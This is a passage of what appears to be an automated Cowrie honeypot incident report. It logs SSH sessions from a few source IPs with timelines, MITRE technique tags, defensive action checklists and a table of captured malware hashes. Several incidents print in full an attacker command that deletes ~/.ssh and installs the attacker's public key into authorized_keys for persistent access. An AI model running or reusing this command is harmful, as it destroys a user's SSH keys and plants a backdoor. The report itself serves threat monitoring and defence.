| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:52:50` | `cowrie.session.connect` |
| `2026-04-25 15:52:50` | `cowrie.client.version` |
| `2026-04-25 15:52:50` | `cowrie.client.kex` |
| `2026-04-25 15:52:51` | `cowrie.login.success` |
| `2026-04-25 15:52:52` | `cowrie.session.params` |
| `2026-04-25 15:52:52` | `cowrie.command.input` |
| `2026-04-25 15:52:52` | `cowrie.command.failed` |
| `2026-04-25 15:52:52` | `cowrie.log.closed` |
| `2026-04-25 15:52:53` | `cowrie.session.params` |
| `2026-04-25 15:52:53` | `cowrie.command.input` |
| `2026-04-25 15:52:54` | `cowrie.session.file_download` |
| `2026-04-25 15:52:54` | `cowrie.log.closed` |
| `2026-04-25 15:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c52df32cda39

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:52 |
| **Last Seen** | 2026-04-25 15:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:52:57` | `cowrie.session.connect` |
| `2026-04-25 15:52:57` | `cowrie.client.version` |
| `2026-04-25 15:52:58` | `cowrie.client.kex` |
| `2026-04-25 15:52:59` | `cowrie.login.success` |
| `2026-04-25 15:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1444462009ba

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:54 |
| **Last Seen** | 2026-04-25 15:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:54:47` | `cowrie.session.connect` |
| `2026-04-25 15:54:47` | `cowrie.client.version` |
| `2026-04-25 15:54:47` | `cowrie.client.kex` |
| `2026-04-25 15:54:49` | `cowrie.login.success` |
| `2026-04-25 15:54:49` | `cowrie.session.params` |
| `2026-04-25 15:54:49` | `cowrie.command.input` |
| `2026-04-25 15:54:49` | `cowrie.command.failed` |
| `2026-04-25 15:54:50` | `cowrie.log.closed` |
| `2026-04-25 15:54:50` | `cowrie.session.params` |
| `2026-04-25 15:54:50` | `cowrie.command.input` |
| `2026-04-25 15:54:51` | `cowrie.session.file_download` |
| `2026-04-25 15:54:51` | `cowrie.log.closed` |
| `2026-04-25 15:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b71a6d0eef9a

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:54 |
| **Last Seen** | 2026-04-25 15:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:54:54` | `cowrie.session.connect` |
| `2026-04-25 15:54:54` | `cowrie.client.version` |
| `2026-04-25 15:54:55` | `cowrie.client.kex` |
| `2026-04-25 15:54:56` | `cowrie.login.success` |
| `2026-04-25 15:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3be8b4bc6f39

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:55 |
| **Last Seen** | 2026-04-25 15:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:55:48` | `cowrie.session.connect` |
| `2026-04-25 15:55:48` | `cowrie.client.version` |
| `2026-04-25 15:55:48` | `cowrie.client.kex` |
| `2026-04-25 15:55:49` | `cowrie.login.success` |
| `2026-04-25 15:55:50` | `cowrie.session.params` |
| `2026-04-25 15:55:50` | `cowrie.command.input` |
| `2026-04-25 15:55:50` | `cowrie.command.failed` |
| `2026-04-25 15:55:51` | `cowrie.log.closed` |
| `2026-04-25 15:55:51` | `cowrie.session.params` |
| `2026-04-25 15:55:51` | `cowrie.command.input` |
| `2026-04-25 15:55:52` | `cowrie.session.file_download` |
| `2026-04-25 15:55:52` | `cowrie.log.closed` |
| `2026-04-25 15:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60972a1e4269

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:55 |
| **Last Seen** | 2026-04-25 15:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:55:55` | `cowrie.session.connect` |
| `2026-04-25 15:55:55` | `cowrie.client.version` |
| `2026-04-25 15:55:56` | `cowrie.client.kex` |
| `2026-04-25 15:55:57` | `cowrie.login.success` |
| `2026-04-25 15:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abace03846c6

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:56 |
| **Last Seen** | 2026-04-25 15:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:56:49` | `cowrie.session.connect` |
| `2026-04-25 15:56:49` | `cowrie.client.version` |
| `2026-04-25 15:56:49` | `cowrie.client.kex` |
| `2026-04-25 15:56:50` | `cowrie.login.success` |
| `2026-04-25 15:56:51` | `cowrie.session.params` |
| `2026-04-25 15:56:51` | `cowrie.command.input` |
| `2026-04-25 15:56:51` | `cowrie.command.failed` |
| `2026-04-25 15:56:51` | `cowrie.log.closed` |
| `2026-04-25 15:56:52` | `cowrie.session.params` |
| `2026-04-25 15:56:52` | `cowrie.command.input` |
| `2026-04-25 15:56:52` | `cowrie.session.file_download` |
| `2026-04-25 15:56:52` | `cowrie.log.closed` |
| `2026-04-25 15:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18e528e8dea3

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:56 |
| **Last Seen** | 2026-04-25 15:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:56:56` | `cowrie.session.connect` |
| `2026-04-25 15:56:56` | `cowrie.client.version` |
| `2026-04-25 15:56:56` | `cowrie.client.kex` |
| `2026-04-25 15:56:58` | `cowrie.login.success` |
| `2026-04-25 15:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be4044cf517a

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:57 |
| **Last Seen** | 2026-04-25 15:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:57:49` | `cowrie.session.connect` |
| `2026-04-25 15:57:49` | `cowrie.client.version` |
| `2026-04-25 15:57:49` | `cowrie.client.kex` |
| `2026-04-25 15:57:50` | `cowrie.login.success` |
| `2026-04-25 15:57:51` | `cowrie.session.params` |
| `2026-04-25 15:57:51` | `cowrie.command.input` |
| `2026-04-25 15:57:51` | `cowrie.command.failed` |
| `2026-04-25 15:57:51` | `cowrie.log.closed` |
| `2026-04-25 15:57:52` | `cowrie.session.params` |
| `2026-04-25 15:57:52` | `cowrie.command.input` |
| `2026-04-25 15:57:52` | `cowrie.session.file_download` |
| `2026-04-25 15:57:52` | `cowrie.log.closed` |
| `2026-04-25 15:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff630dbc99cd

| Field | Detail |
|---|---|
| **Source IP** | `138.121.120[.]11` |
| **First Seen** | 2026-04-25 15:57 |
| **Last Seen** | 2026-04-25 15:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 15:57:56` | `cowrie.session.connect` |
| `2026-04-25 15:57:56` | `cowrie.client.version` |
| `2026-04-25 15:57:56` | `cowrie.client.kex` |
| `2026-04-25 15:57:58` | `cowrie.login.success` |
| `2026-04-25 15:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.121.120[.]11` to AbuseIPDB if not already reported
- [ ] Block `138.121.120[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1a608654e0

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-25 16:16 |
| **Last Seen** | 2026-04-25 16:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 16:16:13` | `cowrie.session.connect` |
| `2026-04-25 16:16:13` | `cowrie.client.version` |
| `2026-04-25 16:16:13` | `cowrie.client.kex` |
| `2026-04-25 16:16:14` | `cowrie.login.success` |
| `2026-04-25 16:16:15` | `cowrie.session.params` |
| `2026-04-25 16:16:15` | `cowrie.command.input` |
| `2026-04-25 16:16:15` | `cowrie.command.failed` |
| `2026-04-25 16:16:15` | `cowrie.log.closed` |
| `2026-04-25 16:16:15` | `cowrie.session.params` |
| `2026-04-25 16:16:15` | `cowrie.command.input` |
| `2026-04-25 16:16:16` | `cowrie.session.file_download` |
| `2026-04-25 16:16:16` | `cowrie.log.closed` |
| `2026-04-25 16:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a4ecb248a5c

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-04-25 16:16 |
| **Last Seen** | 2026-04-25 16:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 16:16:19` | `cowrie.session.connect` |
| `2026-04-25 16:16:19` | `cowrie.client.version` |
| `2026-04-25 16:16:19` | `cowrie.client.kex` |
| `2026-04-25 16:16:20` | `cowrie.login.success` |
| `2026-04-25 16:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4309c1cdf509

| Field | Detail |
|---|---|
| **Source IP** | `119.92.70[.]82` |
| **First Seen** | 2026-04-25 16:22 |
| **Last Seen** | 2026-04-25 16:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 16:22:21` | `cowrie.session.connect` |
| `2026-04-25 16:22:21` | `cowrie.client.version` |
| `2026-04-25 16:22:21` | `cowrie.client.kex` |
| `2026-04-25 16:22:22` | `cowrie.login.success` |
| `2026-04-25 16:22:22` | `cowrie.session.params` |
| `2026-04-25 16:22:22` | `cowrie.command.input` |
| `2026-04-25 16:22:22` | `cowrie.command.failed` |
| `2026-04-25 16:22:22` | `cowrie.log.closed` |
| `2026-04-25 16:22:22` | `cowrie.session.params` |
| `2026-04-25 16:22:22` | `cowrie.command.input` |
| `2026-04-25 16:22:22` | `cowrie.session.file_download` |
| `2026-04-25 16:22:22` | `cowrie.log.closed` |
| `2026-04-25 16:22:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.92.70[.]82` to AbuseIPDB if not already reported
- [ ] Block `119.92.70[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e9517cf7081

| Field | Detail |
|---|---|
| **Source IP** | `119.92.70[.]82` |
| **First Seen** | 2026-04-25 16:22 |
| **Last Seen** | 2026-04-25 16:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 16:22:24` | `cowrie.session.connect` |
| `2026-04-25 16:22:24` | `cowrie.client.version` |
| `2026-04-25 16:22:25` | `cowrie.client.kex` |
| `2026-04-25 16:22:25` | `cowrie.login.success` |
| `2026-04-25 16:22:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.92.70[.]82` to AbuseIPDB if not already reported
- [ ] Block `119.92.70[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `138.121.120[.]11` | **21** | 2026-04-25 15:09 | 2026-04-25 15:57 | 1m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `181.212.174[.]165` | **9** | 2026-04-25 14:58 | 2026-04-25 14:59 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.123[.]75` | **6** | 2026-04-25 16:03 | 2026-04-25 16:33 | 8m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.127.219[.]109` | **2** | 2026-04-25 16:34 | 2026-04-25 16:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `74.249.128[.]83` | **2** | 2026-04-25 15:27 | 2026-04-25 15:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `119.92.70[.]82` | 1 | 2026-04-25 16:22 | 2026-04-25 16:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.76[.]190` | 1 | 2026-04-25 16:19 | 2026-04-25 16:19 | 6s | 0 | `T1592` | 🟢 LOW |
| `152.32.154[.]31` | 1 | 2026-04-25 16:45 | 2026-04-25 16:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.170.144[.]17` | 1 | 2026-04-25 14:53 | 2026-04-25 14:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.239.54[.]162` | 1 | 2026-04-25 14:50 | 2026-04-25 14:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `42.4.63[.]120` | 1 | 2026-04-25 15:27 | 2026-04-25 15:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `43.130.90[.]166` | 1 | 2026-04-25 16:16 | 2026-04-25 16:16 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.236.65[.]252` | 1 | 2026-04-25 15:14 | 2026-04-25 15:14 | 5s | 0 | `T1592` | 🟢 LOW |
| `49.64.85[.]138` | 1 | 2026-04-25 14:48 | 2026-04-25 14:50 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
